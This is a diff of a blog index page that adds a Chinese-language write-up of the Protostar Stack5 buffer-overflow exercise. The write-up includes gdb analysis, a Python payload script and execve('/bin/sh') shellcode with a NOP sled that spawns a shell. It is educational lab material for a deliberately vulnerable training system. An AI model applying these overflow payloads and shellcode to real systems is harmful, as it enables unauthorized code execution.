@@ -62,6 +62,107 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Liveoverflow-0x0F-Shellcode" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/10/03/Liveoverflow-0x0F-Shellcode/" class="article-date">
+  <time datetime="2018-10-03T10:38:22.000Z" itemprop="datePublished">2018-10-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/03/Liveoverflow-0x0F-Shellcode/">Liveoverflow-0x0F-Shellcode</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>本篇博文是关于shellcode的学习，视频前前后后看了十几遍，里面的步骤也跟着做了十几遍，总算是有点眉目了。</p>
+<p>学习需要用到的protostar在视频里面有链接，这里就不贴出来了。</p>
+<p>视频链接：<a href="http://liveoverflow.com/binary_hacking/" target="_blank" rel="noopener">http://liveoverflow.com/binary_hacking/</a></p>
+<p>下面是题目</p>
+<hr>
+<h1 id="Protostar-Stack5"><a href="#Protostar-Stack5" class="headerlink" title="Protostar Stack5"></a>Protostar Stack5</h1><h1 id="About"><a href="#About" class="headerlink" title="About"></a><strong>About</strong></h1><p><strong>Stack5 is a standard buffer overflow, this time introducing shellcode.</strong></p>
+<p><strong>This level is at /opt/protostar/bin/stack5</strong></p>
+<p><strong>Hints</strong></p>
+<ul>
+<li>At this point in time, it might be easier to use someone elses shellcode</li>
+<li>if debugging the shellcode, use\xcc (int3) to stop the program executing and return to the debugger</li>
+<li>remove the int3s once your shellcode is done.</li>
+</ul>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char **argv)
+{
+  char buffer[64];
+  gets(buffer);
+}
+</code></pre><hr>
+<p>首先看源码，很短，就一个gets。放到gdb里面看一下</p>
+<p><img src="https://i.imgur.com/ZmZuJOs.png" alt=""></p>
+<p>首先要弄清楚绿框内的东西是什么意思，这被称为<strong>Calling Convention</strong>(函数调用约定)，也就是说下面call所调用的gets函数的参数要从绿框所指定的地址里面获取，也就是<strong>esp+0x10</strong>这个地址，被<strong>mov DWORD PTR  [esp],eax</strong> 放在了栈顶的位置。</p>
+<p>先在程序开始的地方下个断点，查看栈可以知道此时esp所指向的内容就是ret将要返回的地址(蓝框)，记下此时的esp的值：<strong>0xbffff7bc</strong>，于是我们期望利用gets的溢出将这个返回的地址覆盖成我们想要的地址，这样才能执行shellcode，选哪个地址好呢，其实都无所谓，可以直接选在蓝框后面，也就是红框(<strong>0xbffff7c0</strong>)，这样理论上就可以ret到栈里(黄箭头)来执行shellcode了。</p>
+<p>接下来继续单步执行到call命令之前</p>
+<p><img src="https://i.imgur.com/IMyTgX4.png" alt=""></p>
+<p>从刚才说的可以知道，绿框内的指令将gets所需要的参数的开始的地址放在了栈顶(红框)，因此蓝箭头所指就是字符串存放的位置。黄框就是刚刚记下的ret的地址，从蓝箭头到黄框有20*4字节，现在可以来写个脚本试试了。</p>
+<pre><code>import struct
+padding = &quot;A&quot;*4*19
+ret = struct.pack(&quot;I&quot;, 0xbffff7c0)
+payload = &quot;\xcc&quot;*4 #int3
+print padding + ret + payload
+</code></pre><p><img src="https://i.imgur.com/a7OaI5m.png" alt=""><br>成功将ret地址覆盖！</p>
+<p>我们运行试试</p>
+<p><img src="https://i.imgur.com/0CefmJe.png" alt=""></p>
+<p>得到的结果是<strong>Illegal instruction</strong>(非法指令)。什么意思呢？</p>
+<p>再用gdb看看</p>
+<p><img src="https://i.imgur.com/Net6TSv.png" alt=""></p>
+<p>注意到栈地址不同，可是什么会导致这个差异呢？把整个栈打印出来看看</p>
+<p><strong>x/1000s $esp</strong><br><img src="https://i.imgur.com/nlygY4U.png" alt=""></p>
+<p>可以看到，红色框部分内容是完全一样的，直到黄框内容发生了变化，PWD，也就是目前工作目录，由于PWD的不同，较长的PWD导致栈的内容相当于被往上挤了，于是在上面ret的地方导致栈地址错位，所以刚刚写的脚本就不能准确的跳转到ret后面的那个地址了。</p>
+<p>所以。。这个地方需要一些neat trick 下面是思路:P</p>
+<p><img src="https://i.imgur.com/OCdFu4x.jpg" alt=""></p>
+<p>现在可以尝试添加shellcode来拿shell了</p>
+<p>先找个shellcode：<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a></p>
+<p><img src="https://i.imgur.com/XZCxXXM.png" alt=""></p>
+<pre><code>&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;
+&quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;
+&quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;
+&quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;
+</code></pre><p>然后直接扔到脚本里面就行了</p>
+<pre><code>import struct
+padding = &quot;A&quot;*4*19
+ret = struct.pack(&quot;I&quot;, 0xbffff7c0+32)
+nop = &quot;\x90&quot;*100
+payload = &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot;
+print padding + ret + nop + payload
+</code></pre><p>然后我们尝试运行</p>
+<p><img src="https://i.imgur.com/Rjo0xJh.png" alt=""></p>
+<p>成功拿到shell！！XD</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/10/03/Liveoverflow-0x0F-Shellcode/" data-id="cjmt8vo840000o0obmukre7bu" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Binary-Hacking/">Binary-Hacking</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-使用gdb调试的基本方法" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/09/11/使用gdb调试的基本方法/" class="article-date">
@@ -135,7 +236,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/09/11/使用gdb调试的基本方法/" data-id="cjlxjwn6i0005x8obvbsvtvt3" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/09/11/使用gdb调试的基本方法/" data-id="cjmt8vo8k0005o0obb63xelfs" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/其他/">其他</a></li></ul>
@@ -212,7 +313,7 @@ end start
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/10/实验8-分析一个奇怪的程序/" data-id="cjlxjwn6h0004x8obja6yip8c" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/10/实验8-分析一个奇怪的程序/" data-id="cjmt8vo8k0009o0obh8b441mi" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/汇编/">汇编</a></li></ul>
@@ -293,7 +394,7 @@ end start
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/07/设置栈段时栈内数据改变/" data-id="cjlxjwn6j0007x8obiy3pivgw" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/07/设置栈段时栈内数据改变/" data-id="cjmt8vo8k0008o0obdwmy823a" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/汇编/">汇编</a></li></ul>
@@ -389,7 +490,7 @@ apt-get dist-upgrade #将系统升级到新版本
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/22/kali-Linux虚拟机初始配置/" data-id="cjlxjwn6b0001x8oby0tkufes" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/07/22/kali-Linux虚拟机初始配置/" data-id="cjmt8vo840004o0ob4wwsx7kd" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/其他/">其他</a></li></ul>
@@ -464,7 +565,7 @@ apt-get dist-upgrade #将系统升级到新版本
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/18/bugku隐写2/" data-id="cjlxjwn660000x8obzwuzysjp" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/07/18/bugku隐写2/" data-id="cjmt8vo840003o0ob0nx5et32" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/">misc</a></li></ul>
@@ -511,7 +612,7 @@ apt-get dist-upgrade #将系统升级到新版本
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/12/hello-world/" data-id="cjlxjwn6f0003x8ob95snulu3" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/07/12/hello-world/" data-id="cjmt8vo840001o0ob93nqa0ng" class="article-share-link">Share</a>
       
       
     </footer>
@@ -533,7 +634,7 @@ apt-get dist-upgrade #将系统升级到新版本
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/其他/">其他</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/汇编/">汇编</a></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Binary-Hacking/">Binary-Hacking</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/其他/">其他</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/汇编/">汇编</a></li></ul>
     </div>
   </div>
 
@@ -543,7 +644,7 @@ apt-get dist-upgrade #将系统升级到新版本
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/其他/" style="font-size: 20px;">其他</a> <a href="/tags/汇编/" style="font-size: 20px;">汇编</a>
+      <a href="/tags/Binary-Hacking/" style="font-size: 10px;">Binary-Hacking</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/其他/" style="font-size: 20px;">其他</a> <a href="/tags/汇编/" style="font-size: 20px;">汇编</a>
     </div>
   </div>
 
@@ -552,7 +653,7 @@ apt-get dist-upgrade #将系统升级到新版本
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">七月 2018</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">七月 2018</a></li></ul>
     </div>
   </div>
 
@@ -563,6 +664,10 @@ apt-get dist-upgrade #将系统升级到新版本
     <h3 class="widget-title">最新文章</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2018/10/03/Liveoverflow-0x0F-Shellcode/">Liveoverflow-0x0F-Shellcode</a>
+          </li>
         
           <li>
             <a href="/2018/09/11/使用gdb调试的基本方法/">使用gdb调试的基本方法</a>
@@ -578,10 +683,6 @@ apt-get dist-upgrade #将系统升级到新版本
         
           <li>
             <a href="/2018/07/22/kali-Linux虚拟机初始配置/">kali Linux虚拟机初始配置</a>
-          </li>
-        
-          <li>
-            <a href="/2018/07/18/bugku隐写2/">bugku隐写2</a>
           </li>
         
       </ul>
